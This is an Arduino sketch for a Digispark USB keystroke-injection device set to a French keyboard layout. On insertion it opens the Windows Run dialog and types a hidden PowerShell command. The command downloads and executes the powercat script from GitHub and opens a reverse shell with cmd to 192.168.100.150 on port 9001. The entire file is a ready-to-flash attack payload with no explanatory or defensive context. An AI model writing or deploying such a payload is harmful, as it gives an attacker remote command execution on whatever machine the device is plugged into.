#include "DigiKeyboardFr.h"

void setup() {
  DigiKeyboardFr.sendKeyStroke(0);
  DigiKeyboardFr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboardFr.delay(500);
  DigiKeyboardFr.print("PowerShell.exe -WindowStyle Hidden -Command \"IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1') ;powercat -c 192.168.100.150 -p 9001 -e cmd\"");
  DigiKeyboardFr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardFr.delay(1000);
}

void loop() {}